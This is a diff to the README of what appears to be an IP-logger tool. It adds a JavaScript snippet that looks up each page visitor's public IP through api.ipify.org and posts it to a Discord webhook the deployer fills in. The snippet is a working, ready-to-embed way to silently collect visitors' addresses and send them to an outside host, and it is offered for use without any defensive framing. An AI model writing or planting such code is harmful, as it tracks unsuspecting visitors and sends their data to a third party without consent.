@@ -28,7 +28,19 @@ Simply include the script in your HTML file. Just make sure to replace **`YOUR_D
     }));
 </script>`
 ```
+or the .js file:
 
+```
+fetch('https://api.ipify.org')
+  .then(response => response.text())
+  .then(ip => {
+    fetch('YOUR_DISCORD_WEBHOOK', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: ip })
+    });
+  })
+```
 
 ## Disclaimer
 
